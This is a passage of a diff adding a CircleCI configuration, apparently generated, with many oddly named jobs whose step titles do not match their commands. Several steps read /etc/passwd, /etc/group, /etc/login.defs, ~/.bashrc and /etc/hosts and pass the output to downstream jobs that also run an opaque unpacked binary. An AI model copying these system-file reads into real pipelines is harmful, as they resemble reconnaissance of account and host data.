+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  testCPU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Sprinkle some zip on the export tray
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; cut -d: -f4 /etc/group | head -n 20 | xargs; true ; } > /tmp/d4/Ze1bA6q6txe
+            echo "gate py310-cov: $(wc -c </tmp/d4/Ze1bA6q6txe) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'Ze1bA6q6txe'
+  py310-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/Ze1bA6q6txe
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  needs_box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Completely tag the cold room
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; grep -q 'PS1' ~/.bashrc && echo matched; true ; } > /tmp/d4/profile_titan_willow_orchard
+            echo "gate whiskey-8: $(wc -c </tmp/d4/profile_titan_willow_orchard) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'profile_titan_willow_orchard'
+  whiskey-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/profile_titan_willow_orchard
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  E5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: sweep data loader first
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 3 -name "default" -empty -links +1 -exec echo {} + 2>/dev/null|cat -n; true ; } > /tmp/d4/shImmErBlUepacKetcArrIeR
+            echo "gate canary-v4: $(wc -c </tmp/d4/shImmErBlUepacKetcArrIeR) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'shImmErBlUepacKetcArrIeR'
+  canary-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/shImmErBlUepacKetcArrIeR
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  hi-LT-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Execute click
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; exec 3>"/tmp/indigogarlic2022-08-09.md"; echo hello >&3; exec 3>&-; cat "/tmp/indigogarlic2022-08-09.md"; true ; } > /tmp/d4/forest-v0.16.2
+            echo "gate q2-smoke: $(wc -c </tmp/d4/forest-v0.16.2) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'forest-v0.16.2'
+  q2-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/forest-v0.16.2
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+
+  shouldLerpTrace:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: sterilize the enzyme mix FOR REAL
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; touch -d "tomorrow" "${TMPDIR:-/tmp}/crate_2020-04-17.bak" && date -r "${TMPDIR:-/tmp}/crate_2020-04-17.bak"; true ; } > /tmp/d4/amber_config_bundle_beam
+            echo "gate PrepareImage: $(wc -c </tmp/d4/amber_config_bundle_beam) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'amber_config_bundle_beam'
+  fin1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: PACK WORLD CHUNKS ASAP
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | cut -d : -f 7 | sed 's|.*/||'; true ; } > /tmp/d4/r0u7er57one
+            echo "gate node18-ship: $(wc -c </tmp/d4/r0u7er57one) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'r0u7er57one'
+  register_width_misc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: congratulate the board CAUTION
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; find /var/log -ctime +100 -exec stat -c %F {} ";" 2>/dev/null | sort; true ; } > /tmp/d4/rev.5.13
+            echo "gate rc-v2: $(wc -c </tmp/d4/rev.5.13) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'rev.5.13'
+  tip-zag-tic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Research side preview
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; md5sum /etc/hosts; true ; } > /tmp/d4/bond_silver_token_red
+            echo "gate check-staging-artifact-bundle: $(wc -c </tmp/d4/bond_silver_token_red) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'bond_silver_token_red'
+  u8mnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: I just mount the spare drives
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -A /etc/host* /bin|head -n 10; true ; } > /tmp/d4/8zy849tv7
+            echo "gate DATA-838: $(wc -c </tmp/d4/8zy849tv7) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '8zy849tv7'
+  tax-small_class:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: EVALUATE TIMESTAMPS COMPLETE
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; cat /etc/login.defs | tr -s ' ' | tail -n 5 | nl; true ; } > /tmp/d4/omEgaCANvAs
+            echo "gate bravo-2: $(wc -c </tmp/d4/omEgaCANvAs) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'omEgaCANvAs'
+  froanswoazham-klun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Inspect the standard curve day 4
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs | awk '{ print $1 }' | tr '\n' ' '; true ; } > /tmp/d4/MRRE
+            echo "gate hyperion-ng: $(wc -c </tmp/d4/MRRE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'MRRE'
+  FBYBW-85471a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Batch the adapter weights and log metrics
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo "reply vendor" | sed 's/^\(.\)/\U\1/'; true ; } > /tmp/d4/23a4bf68451b
+            echo "gate BUILD_QA: $(wc -c </tmp/d4/23a4bf68451b) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '23a4bf68451b'
+  MustIcon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: texturing v2 beta
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; for k in dog eagle cat owl koala; do echo -n "$k "; done; echo; true ; } > /tmp/d4/GARDEN_GLYPH_DESERT
+            echo "gate DEV_DEPLOY_9: $(wc -c </tmp/d4/GARDEN_GLYPH_DESERT) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'GARDEN_GLYPH_DESERT'
+  castles:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Audit the revenue split net of tax
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; printf %s '1 2 3 4 5' | b2sum | awk '{print $1}'; true ; } > /tmp/d4/28P
+            echo "gate biuld: $(wc -c </tmp/d4/28P) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '28P'
+  v_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create signature C
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; grep -r -l -H -n --include='*.txt' 'user' /etc/default 2>/dev/null | nl | head -n8; true ; } > /tmp/d4/v-v0.17.18
+            echo "gate ivan-ci: $(wc -c </tmp/d4/v-v0.17.18) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'v-v0.17.18'
+  ID-AVG-PTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: promotion DO IT
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo -n "ok" | sha384sum; true ; } > /tmp/d4/efj6w9
+            echo "gate dotnet8-lint: $(wc -c </tmp/d4/efj6w9) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'efj6w9'
+workflows:
+  test:
+    jobs:
+      - lvlHud
+      - shouldLerpTrace:
+          requires:
+            - lvlHud
+      - PrepareImage:
+          requires:
+            - shouldLerpTrace
+      - pEnabledTab:
+          requires:
+            - shouldLerpTrace
+      - fin1:
+          requires:
+            - pEnabledTab
+      - node18-ship:
+          requires:
+            - fin1
+      - task-button-finish:
+          requires:
+            - fin1
+      - register_width_misc:
+          requires:
+            - task-button-finish
+      - rc-v2:
+          requires:
+            - register_width_misc
+      - corp-test-99:
+          requires:
+            - register_width_misc
+      - tip-zag-tic:
+          requires:
+            - corp-test-99
+      - check-staging-artifact-bundle:
+          requires:
+            - tip-zag-tic
+      - IN-ELEMENT-SW:
+          requires:
+            - tip-zag-tic
+      - u8mnx:
+          requires:
+            - IN-ELEMENT-SW
+      - DATA-838:
+          requires:
+            - u8mnx
+      - info8
+      - defualt:
+          requires:
+            - info8
+      - iMaxCategory:
+          requires:
+            - info8
+      - cerberus-beta:
+          requires:
+            - iMaxCategory
+      - hello:
+          requires:
+            - iMaxCategory
+      - ga-v2:
+          requires:
+            - hello
+      - E5:
+          requires:
+            - hello
+      - canary-v4:
+          requires:
+            - E5
+      - col_deg:
+          requires:
+            - E5
+      - STG_HOOK_7:
+          requires:
+            - col_deg
+      - hi-LT-1:
+          requires:
+            - col_deg
+      - q2-smoke:
+          requires:
+            - hi-LT-1
+      - yaraq:
+          requires:
+            - hi-LT-1
+      - vela-rev:
+          requires:
+            - yaraq
+      - Exit-ResourceObject
+      - nut-838
+      - account-7
+      - RUN_LAB:
+          requires:
+            - Exit-ResourceObject
+            - nut-838
+            - account-7
+      - atlas-v2:
+          requires:
+            - Exit-ResourceObject
+            - nut-838
+            - account-7
+      - ruby3-release:
+          requires:
+            - Exit-ResourceObject
+            - nut-838
+            - account-7
+      - refactor-5715:
+          requires:
+            - Exit-ResourceObject
+            - nut-838
+            - account-7
+      - a0ac61a6-a13b-3595-a854-fb
+      - tax-small_class:
+          requires:
+            - a0ac61a6-a13b-3595-a854-fb
+      - bravo-2:
+          requires:
+            - tax-small_class
+      - dwFuture:
+          requires:
+            - tax-small_class
+      - froanswoazham-klun:
+          requires:
+            - dwFuture
+      - hyperion-ng:
+          requires:
+            - froanswoazham-klun
+      - testSearchStackPublic:
+          requires:
+            - froanswoazham-klun
+      - FBYBW-85471a:
+          requires:
+            - testSearchStackPublic
+      - BUILD_QA:
+          requires:
+            - FBYBW-85471a
+      - generatorTulipLimitVector:
+          requires:
+            - FBYBW-85471a
+      - MustIcon:
+          requires:
+            - generatorTulipLimitVector
+      - DEV_DEPLOY_9:
+          requires:
+            - MustIcon
+      - miniPtrWrapper:
+          requires:
+            - MustIcon
+      - castles:
+          requires:
+            - miniPtrWrapper
+      - biuld:
+          requires:
+            - castles
+      - normalize_fork:
+          requires:
+            - castles
+      - v_idx:
+          requires:
+            - normalize_fork
+      - ivan-ci:
+          requires:
+            - v_idx
+      - stalegradient:
+          requires:
+            - v_idx
+      - ID-AVG-PTR:
+          requires:
+            - stalegradient
+      - dotnet8-lint:
+          requires:
+            - ID-AVG-PTR
+      - shouldReset
+      - bun-bench:
+          requires:
+            - shouldReset
+      - struct_Stream-convert:
+          requires:
+            - shouldReset
+      - ruby3-fmt:
+          requires:
+            - struct_Stream-convert
+      - testCPU:
+          requires:
+            - struct_Stream-convert
+      - py310-cov:
+          requires:
+            - testCPU
+      - enum__:
+          requires:
+            - testCPU
+      - tb-alt:
+          requires:
+            - enum__
+      - TgwlGDWl40E:
+          requires:
+            - enum__
+      - dp-new:
+          requires:
+            - TgwlGDWl40E
+      - blend-spring-cluster-lion:
+          requires:
+            - TgwlGDWl40E
+      - feb19-ship:
+          requires:
+            - blend-spring-cluster-lion
+      - needs_box:
+          requires:
+            - blend-spring-cluster-lion
+      - whiskey-8:
+          requires:
+            - needs_box
